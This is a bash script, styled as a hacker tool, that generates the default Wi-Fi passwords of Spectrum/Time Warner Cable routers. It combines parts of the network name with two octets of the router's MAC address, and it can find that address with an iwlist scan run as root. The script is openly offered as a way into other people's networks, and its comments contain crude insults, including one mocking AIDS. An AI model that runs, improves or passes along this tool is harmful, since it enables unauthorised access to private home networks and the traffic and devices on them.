#!/bin/bash
#
# by malexa
# # 1337 f4G haxx0r
#
# top kek time warner cable or spectrum
# # run this monsta on TV
#
#
# ctrl-f for 'top kek' to find what this super, top-secret algo is... 

NO_BSSID=no
BSSID=" "
ESSID=" "

function root_check {
	declare -i UR_UID=`id -u`
	declare -i ZEERO=0

	if [ "$UR_UID" -ne "$ZEERO" ]; then
		echo ""
		echo IF YOU OMIT THE BSSID, YOU MUST RUN THIS AS ROOT!!! ; \
			exit 1
	fi
}


function print_usage {
	echo -e "\033[1;29m\x20\x20\u0488TimeWi-Fuck \x20\u0488\nSPECTRUM \\ TWC Password Generator"
	echo -e "\t\033[0;36mby: malexa\n"
	echo -e "\033[0m\033[1;29mUSAGE:: \033[0;36mtimewi-fuck.sh <ESSID> <BSSID>\n"
	echo -e "\033[0m\033[1;29mATTN:\033[0m This only works for boxes that have default password, where customer did not change (almost everyone lol)."; \
		exit 1
}

function do_bssid {
	touch ./.bssid
	echo $@ > ./.bssid
	A4=`gawk --field-separator \: '{ print $4 }' ./.bssid`
	A5=`gawk --field-separator \: '{ print $5 }' ./.bssid`
	NUM4=`echo -e "print('$A4'.upper())" | python3 -`
	NUM5=`echo -e "print('$A5'.upper())" | python3 -`
	rm ./.bssid
	export NUM4
	export NUM5
}

function do_essid {
	touch ./.essid
	echo $@ > ./.essid
	B1=`awk '{print substr($0,0,7)}' ./.essid`
	B2=`awk '{print substr($0,length($0)-1,2)}' ./.essid`
	rm ./.essid
	LASTTWO="$B2"
	FIRSTSEVEN="$B1"
	export FIRSTSEVEN
	export LASTTWO
	echo -e "\033[0;31mTOP SECRET PASSWORD BEG. & END. : $FIRSTSEVEN, $LASTTWO"
}

#
### GET BY JUST TYPING IN THE SSID
#### hell yeeah
#
function auto_from_essid {

	root_check

	local loopcnt=0
	local loc_essid=""
	local loc_bssid=""
	
	## ARGUMENT PARSE
	### fugg, oh well ignore my attempts at fancy sh!t
	# ;_;
	until [ -z "$1" ]
	do
		if test -z $loopcnt; then
			let "loc_essid = $1"
		else
			let "loc_bssid = $1"
		fi
		let "loopcnt += 1"
		shift
	done

	## SETUP
	export "EESSID=loc_essid"
	echo -e "\033[0m" # dont give iwlist's bitching any colorz

	## FIND THE BSSID FROM ESSID
	touch ./.iwout
	iwlist scanning | sed -n '/[[:xdigit:]][:| ][[:xdigit:]]/{p;x};/^$EESSID/{p;q}' > ./.iwout 
	
	## GIVE US ONLY THE MAC ADDY
	declare -u AUTO_BSSID
	eval AUTO_BSSID=$(head -n 1 ./.iwout | tail -c 18)

	### CHECK AND SEE IF ABOVE SH!7 ACTUALLY WERK'D
	if [ -z "$AUTO_BSSID" ]; then
		echo -e "\033[1;29mFAILED...FAILURE\033[0m\x20Manually input the AP MAC/BSSID..."; \
			exit 1
	else
		echo -e "\033[1;29mSUCCESS...SUCCESS\033[0m\x20Congratz... using $AUTO_BSSID to cook up the pass for: $ESSID."
	fi

	# #
	echo -e "\033[0;31m" # turn colorz on again
	BSSID="$AUTO_BSSID"

	## CLEANUP
	unset AUTO_BSSID
	unset $EESSID
	rm ./.iwout
}

#####
#### TOP-FUCKING KEK, SPECTRUM-TIME WARNER...
### top kek
#
function make_password {
	echo $FIRSTSEVEN$NUM4$NUM5$LASTTWO
}

#
### ARGUMENT HANDLING, yo
#
if test -z "$1"
then
	print_usage
elif test -z "$2"
then
	unset $NO_BSSID
	NO_BSSID=yes
	export $NO_BSSID
else
	export $NO_BSSID
fi

# tell the skiddy wussup
echo -e "\033[1;29mPROCEEDING WITH GENN'ING..."

#
### ESSID & BSSID
#
unset $ESSID
ESSID="$1"
export $ESSID
do_essid $ESSID # get essid components

if [[ "$NO_BSSID" == "yes" ]]; then
# # # the hard way  
	echo NO BSSID given
	export BSSID
	auto_from_essid $ESSID $BSSID
	do_bssid $BSSID
else
# # # the easy way
	unset $BSSID
	BSSID="$2"
	export BSSID
	do_bssid $BSSID
fi

#
### DA RESULTZ IS HEREE!!!...
#

# ey, john, u justa lamer with aids
echo -e "\n\033[1;29mAN IDIOTIC SAVANT APPROACHES YOU:\033[0;49m"
echo -e "\033[1;29m\""; \
	make_password && echo '"'; \
	echo -e "\tYOU OVERESTIMATED HIM. HE YIELDS THE ABOVE PASSWORD."
echo -e "\n\033[0m\033[0;36m\033[1;29m\tgreetz to all in the 214/903, fullchan, and uh, all \u043e\u0442 \u043c\u0435\u043d\u044f \u0430 malexa!!! o7\n\t\tfrom texas yall\033[0m"

